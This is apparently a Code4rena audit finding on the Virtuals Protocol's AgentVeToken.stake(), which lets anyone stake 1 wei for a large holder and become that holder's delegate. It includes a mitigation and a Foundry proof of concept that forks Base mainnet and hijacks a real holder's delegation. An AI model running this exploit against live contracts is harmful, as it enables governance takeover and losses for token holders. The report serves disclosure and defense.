---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/bridge
  - sector/governance
  - sector/staking
  - sector/token
protocol: "[[Virtuals]]"
auditors:
  - "[[natachi]]"
report: "https://code4rena.com/reports/2025-04-virtuals-protocol"
genome:
  - "[[slippage]]"
  - "[[indirect-loss]]"
  - "[[timestamp-dependence]]"
  - "[[vote-delegation-loop]]"
---
# [H-02] Anybody can control a user’s delegate by calling `AgentVeToken.stake()` with 1 wei

- id: 61823
- impact: HIGH
- protocol: [[Virtuals]] Protocol
- reporter: natachi (Code4rena)
- source: https://code4rena.com/reports/2025-04-virtuals-protocol

## Summary


The bug report is about a vulnerability in the `AgentVeToken` contract, which is part of the `2025-04-virtuals-protocol` project on GitHub. The `AgentVeToken.stake()` function automatically updates the delegatee for the receiver, which can be exploited by a malicious user. By staking 1 wei of the LP token and setting themselves as the delegatee, they can gain a majority voting power in the AgentDAO and submit a malicious proposal. The recommended mitigation steps are to either remove the automatic call to `_delegate` or only do the call if `sender == receiver`. The report includes a proof of concept code to demonstrate the vulnerability. 

## Details



<https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentVeToken.sol# L80>

`AgentVeToken.stake()` function will automatically update the delegatee for the receiver. A malicious user can stake 1 wei of the LP token, set the receiver to be a user with an high balance of the veTokens, and set themselves as the delegatee.
```

function stake(uint256 amount, address receiver, address delegatee) public {
    require(canStake || totalSupply() == 0, "Staking is disabled for private agent"); // Either public or first staker

    address sender = _msgSender();
    require(amount > 0, "Cannot stake 0");
    require(IERC20(assetToken).balanceOf(sender) >= amount, "Insufficient asset token balance");
    require(IERC20(assetToken).allowance(sender, address(this)) >= amount, "Insufficient asset token allowance");

    IAgentNft registry = IAgentNft(agentNft);
    uint256 virtualId = registry.stakingTokenToVirtualId(address(this));

    require(!registry.isBlacklisted(virtualId), "Agent Blacklisted");

    if (totalSupply() == 0) {
        initialLock = amount;
    }

    registry.addValidator(virtualId, delegatee);

    IERC20(assetToken).safeTransferFrom(sender, address(this), amount);
    _mint(receiver, amount);
    _delegate(receiver, delegatee); // @audit-high Anybody can change delegate if they stake 1 wei LP
    _balanceCheckpoints[receiver].push(clock(), SafeCast.toUint208(balanceOf(receiver)));
}
```

Since these are the tokens that are used as voting power in the AgentDAO, a malicious user can donate 1 wei to multiple users with high balances, receive a majority voting power, then submit a malicious proposal.

### Recommended mitigation steps

Either remove the automatic call to `_delegate` or only do the call if `sender == receiver`.

### Proof of Concept

Create a new foundry project, set `BASE_RPC_URL`, and run.
```

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IAgentToken is IERC20 {
    function distributeTaxTokens() external;

    function projectTaxPendingSwap() external view returns (uint256);

    function projectTaxRecipient() external view returns (address);

    function setProjectTaxRecipient(address projectTaxRecipient_) external;

    function setSwapThresholdBasisPoints(uint16 swapThresholdBasisPoints_) external;

    function setProjectTaxRates(
        uint16 newProjectBuyTaxBasisPoints_,
        uint16 newProjectSellTaxBasisPoints_
    ) external;
}

interface IVeToken {
    function stake(uint256 amount, address receiver, address delegatee) external;

    function delegates(address account) external view returns (address);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

contract StakeDelegatePOC is Test {
    IAgentToken agentToken = IAgentToken(0x1C4CcA7C5DB003824208aDDA61Bd749e55F463a3);
    address agentPair = 0xD418dfE7670c21F682E041F34250c114DB5D7789;

    IERC20 virtualToken = IERC20(0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b);
    address bridge = 0x4200000000000000000000000000000000000010;
    IUniswapV2Router router = IUniswapV2Router(0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24);

    string BASE_RPC_URL = vm.envString("BASE_RPC_URL");
    address user = makeAddr("user");
    uint256 virtualAmount = 2000 ether;

    function setUp() public {
        uint256 forkId = vm.createFork(BASE_RPC_URL, 29_225_700);
        vm.selectFork(forkId);

        // Set up the user with virtual tokens
        vm.prank(bridge);
        virtualToken.mint(user, virtualAmount);
    }

    function test_malicious_stake_delegate_poc() public {
        vm.startPrank(user);
        virtualToken.approve(address(router), type(uint256).max);
        agentToken.approve(address(router), type(uint256).max);

        // Swap half of the virtual tokens to agent tokens
        address[] memory path = new address[](2);
        path[0] = address(virtualToken);
        path[1] = address(agentToken);
        router.swapExactTokensForTokens(virtualAmount / 2, 0, path, user, block.timestamp);

        // Add liquidity to the pool to get LP tokens
        router.addLiquidity(
            address(virtualToken),
            address(agentToken),
            virtualAmount / 2,
            agentToken.balanceOf(user),
            1,
            1,
            user,
            block.timestamp
        );

        address gameDeployer = 0xD38493119859b8806ff28C32c41fdd67Ef41b8Ef; // Main holder of veTokens

        IVeToken veToken = IVeToken(0x974a21754271dD3d71a16F2852F8e226a9276b3E);
        assertNotEq(veToken.delegates(gameDeployer), user);

        // Stake 1 wei of LP for gameDeployer to update delegate
        IERC20(agentPair).approve(address(veToken), 1);
        veToken.stake(1, gameDeployer, user);
        assertEq(veToken.delegates(gameDeployer), user);
    }
}
```

**Virtuals marked as informative**

---
